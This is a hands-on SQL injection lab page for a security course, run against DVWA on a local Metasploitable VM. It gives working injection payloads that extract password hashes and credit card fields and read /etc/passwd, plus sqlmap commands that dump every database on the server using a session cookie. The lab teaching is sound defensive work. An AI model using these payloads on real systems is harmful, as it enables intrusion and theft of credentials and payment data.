---
title: "Activity: SQL Injection"
number: 10
description: A hands-on activity exploring SQLi with DVWA
published: true
include_toc: true
slug: sqli
---


For this activity, run virt-manager and start your Metasploitable VM. Browse to <http://192.168.56.102/dvwa> from a browser with Kali and log with username `admin` and password `password`.

**Important:** On the menu on the left, select "DVWA Security" and change the security level to "low".

Select SQL Injection, and click "View Help" and "View Source" to understand what SQL query is being used.

## Try to trigger an error

If you can submit input that will cause the route to crash, then this suggests that the route does not properly handle user input, and that it might be vulnerable to an injection attack.

Enter a single quote: `'` and press enter. This will show an error. It is possible that the route is running a SQL query that uses a single quote mark.

Try the following SQLi queries.

## Simple injection using tautology

`test' OR 1=1#`

This query will display all records that are True or False. The `test'` parameter will probably not be equal to any user in the Database and will equal to False. The other part `1=1` will be `True` since `1` (one) is equal to `1` (one). The `#` sign comments out any following SQL code or error. The query that executes in the database looks like this;

`SELECT first_name, last_name FROM users WHERE user_id = 'test' or '1'='1';`

## Union-based SQLi queries

Union clause allows attackers to execute additional Select queries and add results to the original query. It can be used to get data from other tables. However, you need to make sure that:

- Each query return the same amount of columns
- The data types in each column must be compatible between queries"

### Show database version

`' union select null, version()#`

### Show hostname

`' union select null, @@hostname#`

### Show port

`' union select null, @@port#`

### Concatenate more host information fields

`' union select null, concat(@@version, 0x0a, @@hostname, 0x0a, @@datadir, 0x0a, @@version_compile_os) #`

### Show DMBS username

`' union select null, user() #`

### Show all users and the database name 

Demonstrates joining a tautology query with a `database() query using the `union` command.

`' or 0=0 union select null, database() #`

### Show just the database name

Again demonstrates joining two queries with the union command. Both commands below are equivalent.

`' or 0=1 union select null, database() #`

`' union select null, database() # `

### Show all tables in the database. 

Note: the route's query is designed to return two fields, so we request `null` as the first field in our injection.

`' and 1=0 union select null, table_name from information_schema.tables #`

### Show all databases and tables

`' and 1=0 union select table_name, table_schema from information_schema.tables #`

### Display all the columns fields in the `information_schema` `user` table. 

The "surname" field in the rendered HTML result displays the field names of the database.

`' and 1=0 union select null, column_name from information_schema.columns where table_name = 'users' #`

### Display the user, password column 

Display the user, password column field contents in the `information_schema` user table. Reveals MD5 password hashes that then can be googled to reverse.

`' and 1=0 union select user, password from users #`

### Display firstname, lastname, username, password (all on one line)

`' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`

### List all columns in the ‘credit_cards’ table. 

Display all the columns fields in the information_schema ‘credit_cards’ table. 

The "surname" field in the rendered HTML shows these column fields.

`' and 1=0 union select null, column_name from information_schema.columns where table_name = 'credit_cards' #`

### Display credit card information 

Display credit card numbers, CCV, and expiration date from `credit_cards` table.

Note: the route's query is designed to return only two fields, so we must concatenate (`CONCAT`) the last two fields in our `UNION`'ed query.

`' and 1=0 union select null, CONCAT(0x0a, ccnumber, 0x0a, ccv, 0x0a, expiration) from owasp10.credit_cards#`

### Print contents of the passwd file

`' union select null, LOAD_FILE('/etc/passwd') #`

## SQLMap demo

You can automate testing for and exploiting SQL injection vulnerabilities using the open-source python tool [`sqlmap`](https://github.com/sqlmapproject/sqlmap). This tool comes pre-installed in your Kali. 

### Provide a valid COOKIE

To probe DVWA's `/dvwa/vulnerabilities/sqli/` route, `sqlmap` needs to be able to make authenticated requests. This means we need to first log in to DVWA, and then give `sqlmap` our session cookie.

In Firefox on Kali, after you have logged into DVWA, open the developer console (press `F12`) and select `Console`. Run the command `document.cookie` to view the cookies for the current site:

{% include lab-image.html image='dvwa-console-cookie.png' %}

Copy the output. You will pass this to `sqlmap` as the `--cookie` argument. This will let `sqlmap` make authenticated requests, and the DVWA security will be set to "LOW" for those requests. 

For convenience, set your cookie value to a variable in your shell session using `export`. This will work for the lifetime of your shell. For example, if my cookie were as shown in the image below, I would run the following (displayed as a screenshot to prevent copy-pasting, which will not work):

{% include lab-image.html image='dvwa-console-cookie-export.png' %}

And then all of my later commands would access this variable via `--cookie="$COOKIE"`. The example commands below use this variable. **This will not work if you do not set your `COOKIE` variable to the value from your own session.**

A correct `COOKIE` usage will look like this:

{% include lab-image.html image='dvwa-sqlmap-correct-cookie.png' %}

<div class='alert alert-danger'><strong>Heads up!</strong> Be sure to <code>export</code> your own valid <code>COOKIE</code> variable in your shell session before using the code examples below. If you do not provide a valid session cookie, then <code>sqlmap</code> will report that you are being redirected to <code>/dvwa/login.php</code>, as shown below. 

{% include lab-image.html image='dvwa-sqlmap-login-redirect.png' %}

<p>If you see this, then go back and <code>export</code> a fresh cookie.</p>

</div>

### Provide a valid target URL

We need to provide `sqlmap` with a parameterized example URL. In the case of DVWA, the SQL Injection is manifest as a URL GET parameter, in the form of `?id=<value>` in the URL. The easiest way to get a valid injectable URL for `sqlmap` to use against DVWA is to submit *any* query to the SQL Injection page, and then copy-paste the resultant URL. The image below shows the resultant url from submitting a query of `1` on `/dvwa/vulnerabilities/sqli/`:

{% include lab-image.html image='dvwa-sqlmap-example-url.png' %}

We see that the URL is `http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#`


### Probe the URL for vulnerabilities

From your Kali shell with the `export`ed `COOKIE` variable, run the following command. When prompted for input, accept the default options.

```shell
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" 
```

`sqlmap` will remember for future commands that it already discovered that the `id` argument is vulnerable to an injection attack.


### Dump the current database

Now that `sqlmap` has learned about the `id` argument vulnerability, we can dump the underlying database. The `--dump` flag will dump only the database implicitly used by the vulnerable route -- in this case, that is the `dvwa` database. All tables on that database will be dumped. Dump that database with the following command:

```shell
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --dump
```

### Dump a specific table

Instead of dumping all tables on a database, you can specify specific databases and tables with the database (`-D`) and table (`-T`) flags. For the "users" table in this "dvwa" database, this would look like this:

```shell
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --dump -D dvwa -T users
```

### Dump all databases in the MySQL Server

We can dump more than just the `dvwa` database on this MySQL server. First, list the other databases hosted on this server:

```shell
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --dbs
```

This shows the following 7 databases:

```
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195
```

We can dump *all* of these using the `--dump-all` flag. **Warning**, this command will take a long time. There are a lot of tables across these databases on the MySQL server on Metasploitable2.


```shell
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --dump-all
```

This demonstrates why isolating apps from one another -- why using separate MySQL servers for separate apps, instead of hosting multiple apps on a single server -- can help reduce the blast radius if an app is found to have a vulnerability. A SQL injection in the DVWA application exposed *all* apps hosted on this server.
